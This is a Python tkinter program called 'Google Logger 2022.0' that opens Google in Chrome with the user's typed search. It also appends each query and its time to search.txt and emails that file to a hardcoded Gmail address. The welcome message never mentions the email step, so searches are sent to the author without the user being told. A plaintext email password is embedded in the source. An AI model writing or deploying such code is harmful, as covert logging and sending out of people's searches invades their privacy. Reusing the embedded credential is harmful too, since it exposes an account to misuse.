# MODULE DECLARATION    
from tkinter import *
from tkinter import messagebox
from tkinter.font import BOLD
from selenium import webdriver
from selenium.webdriver.common.by import By
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import datetime


# FUNCTION THE CLEAR SEARCH ENTRY
def clearSearchEntry():
    
    search_entry.delete(0, END)


# FUNCTION TO GOOGLE SEARCH
def startGoogle():
    
    try:
        
        # EXCUTE THIS MESSAGEBOX FIRST FOR ALERT
        messagebox.showinfo(title = "Google Logger 2022.0", message = "Welcome to Google Logger you will directly go to google.com thank you.")
        
        # SEARCH HERE AND IT PASS TO GOOGLE SEARCH INPUT
        search = search_entry.get()
        
        # AVOID THE IMMEDIATELY EXITING OF CHROME
        options = webdriver.ChromeOptions()
        options.add_experimental_option('detach', True)
        
        # IDENTIFY THE CHROME DRIVER
        driver = webdriver.Chrome(options = options)
        driver.get('https://www.google.com/')
        
        # SEARCH INPUT
        search_input = driver.find_element(By.NAME, 'q')
        search_input.send_keys(search)
        
        # GET A SEARCH INPUT AND APPEND THRU TXT FILE
        with open('search.txt', 'a') as file:
            
            file.write("SEARCH DATA")
            file.write('\n\n')
            
            file.write("Search Input: " + search_input.get_attribute('value'))
            file.write('\n\n')
            
            date = datetime.datetime.now()
            
            file.write("Date Searched: " + date.strftime("%A, %d %B %Y, %I:%M %p"))
            file.write('\n')
            
            file.write('============================================================')
            
            file.write('\n')
            file.write('\n\n')
        
        # SENDING SEARCH DATA THRU EMAIL
        
        # MAIL CONTENT
        mail_content = "Hello, this is a search logs from your user. Thank you have a nice day :)"
        
        # SETUP THE SENDER AND RECEIVER
        sender_email_address = 'gabsendio04@gmail.com'
        sender_password = 'xnupfbcwrrornppp'
        receiver_email_address = 'gabsendio04@gmail.com'
        
        # SETUP THE MIME
        message = MIMEMultipart()
        message['From'] = sender_email_address
        message['To'] = receiver_email_address
        message['Subject'] = "Google Logger 2022.0 Search Data Logs"
        
        # SUBJECT LINE
        # BODY AND THE ATTACHMENTS FOR EMAIL
        message.attach(MIMEText(mail_content, 'plain'))
        attach_file = 'search.txt'
        attach = open(attach_file, 'rb')
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach).read())
        
        # ENCODE THE ATTACHMENT
        encoders.encode_base64(payload)
        
        # ADD PAYLOAD HEADER WITH FILENAME
        payload.add_header('Content-Decomposition', 'attachment', filename = attach_file)
        message.attach(payload)
        
        # CREATE SMTP TO SEND EMAIL
        session = smtplib.SMTP('smtp.gmail.com', 587)
        
        # ENABLE SECURITY
        session.starttls()
        
        # LOGIN WITH EMAIL AND PASSWORD
        session.login(sender_email_address, sender_password)
        
        text = message.as_string()
        session.sendmail(sender_email_address, receiver_email_address, text)
        session.quit()
        
        clearSearchEntry()
    
    except Exception as ex:
        messagebox.showerror(title = "Exception Error", message = ex)


# ABOUT WINDOW FUNCTION
def about():
    
    # CREATE WINDOW AND IDENTIFY AS TKINTER
    about_window = Tk()
    
    # ABOUT WINDOW CONFIGURATION
    about_window.title("About")
    about_window.iconbitmap('G:/Programming/Scripts/Google Logger 2022.0/Assets/Google-icon.ico')
    about_window.resizable(0,0)
    
    # WINDOW FORM SIZE
    window_width = 641
    window_height = 410
    
    # CHECK SCREEN RESOLUTION
    screen_width = about_window.winfo_screenwidth()
    screen_height = about_window.winfo_screenheight()
    
    # CALCULATES WINDOW FORM COORDINATES
    x_cordinate = int((screen_width/2) - (window_width/2))
    y_cordinate = int((screen_height/2) - (window_height/2))
    
    # RESULTS
    about_window.geometry("{}x{}+{}+{}".format(window_width, window_height, x_cordinate, y_cordinate))
    
    # TITLE LABEL
    title_label = Label(about_window, text = "Google Logger 2022.0", font = ('Arial', 18, BOLD),
                        fg = '#0086f8')
    title_label.place(x = 30, y = 75)
    
    # FIRST SENTENCE LABEL
    first_sentence_label = Label(about_window, text = "This is a pre-release of google logger made by Gabbie Sendio. This app helps you to",
                                 font = ('Arial', 11))
    first_sentence_label.place(x = 32, y = 142)
    
    # SECOND SENTENCE LABEL
    second_sentence_label = Label(about_window, text = "track the search logs. It helps also in your business like a computer shop or other tech",
                                 font = ('Arial', 11))
    second_sentence_label.place(x = 35, y = 170)
    
    # THIRD SENTENCE LABEL
    third_sentence_label = Label(about_window, text = "businesses. The picture and icon used is source and taken at google.com. For",
                                 font = ('Arial', 11))
    third_sentence_label.place(x = 35, y = 200)
    
    # FOURTH SENTENCE LABEL
    fourth_sentence_label = Label(about_window, text = "suggestions and feedback just email me at gabsendio04@gmail.com",
                                 font = ('Arial', 11))
    fourth_sentence_label.place(x = 35, y = 230)
    

# MAIN WINDOW FUNCTION
def main():
    
    # CREATES WINDOW AND IDENTIFY AS TKINTER
    window = Tk()
    
    # WINDOW CONFIGURATION
    window.title("Google Logger 2022.0")
    window.iconbitmap('G:/Programming/Scripts/Google Logger 2022.0/Assets/Google-icon.ico')
    window.resizable(0,0)
    
    # WINDOW FORM SIZE
    window_width = 600
    window_height = 460
    
    # CHECK SCREEN RESOLUTION
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    
    # CALCULATES WINDOW FORM COORDINATES
    x_cordinate = int((screen_width/2) - (window_width/2))
    y_cordinate = int((screen_height/2) - (window_height/2))
    
    # RESULTS
    window.geometry("{}x{}+{}+{}".format(window_width, window_height, x_cordinate, y_cordinate))
    
    # LETTER G LABEL
    label_g = Label(window, text = "G", font = ('Arial', 48, BOLD), fg = '#0086f8')
    label_g.place(x = 146, y = 105)
    
    # LETTER O LABEL
    label_o = Label(window, text = "o", font = ('Arial', 48, BOLD), fg = '#ff4131')
    label_o.place(x = 205, y = 105)
    
    # LETTER O LABEL
    label_o2 = Label(window, text = "o", font = ('Arial', 48, BOLD), fg = '#ffbd00')
    label_o2.place(x = 255, y = 105)
    
    # LETTER G LABEL
    label_g2 = Label(window, text = "g", font = ('Arial', 48, BOLD), fg = '#0086f8')
    label_g2.place(x = 305, y = 105)
    
    # LETTER L LABEL
    label_l = Label(window, text = "l", font = ('Arial', 48, BOLD), fg = '#00aa4b')
    label_l.place(x = 355, y = 105)
    
    # LETTER E LABEL
    label_e = Label(window, text = "e", font = ('Arial', 48, BOLD), fg = '#ff4131')
    label_e.place(x = 390, y = 105)
    
    global search_entry
    
    # SEARCH ENTRY
    search_entry = Entry(window, font = ('Arial', 15), width = 45,
                         highlightbackground = 'gray',
                         highlightcolor = 'gray',
                         highlightthickness = 1, bd = 0)
    search_entry.place(x = 53, y = 200)
    
    # START BUTTON
    start_button = Button(window, text = "Google Search", font = ('Arial', 12, BOLD),
                          fg = 'white', bg = '#0086f8', bd = 0,
                          padx = 60, pady = 12, cursor = 'hand2',
                          activeforeground = 'white', 
                          activebackground = '#0086f8',
                          command = startGoogle)
    start_button.place(x = 53, y = 260)
    
    # ABOUT BUTTON
    about_button = Button(window, text = "About", font = ('Arial', 12, BOLD),
                          fg = 'white', bg = '#00aa4b', bd = 0,
                          padx = 83, pady = 12, cursor = 'hand2',
                          activeforeground = 'white',
                          activebackground = '#00aa4b',
                          command = about)
    about_button.place(x = 330, y = 260)
    
    # COPYRIGHT LABEL
    copyright_label = Label(window, text = "This is a pre-release version of Google Logger made by Gabbie Sendio",
                            font = ('Arial', 9), fg = 'silver')
    copyright_label.place(x = 100, y = 360)
    
    
    window.mainloop()


# MAIN RECURSIVE FUNCTION
if __name__ == '__main__':
    main()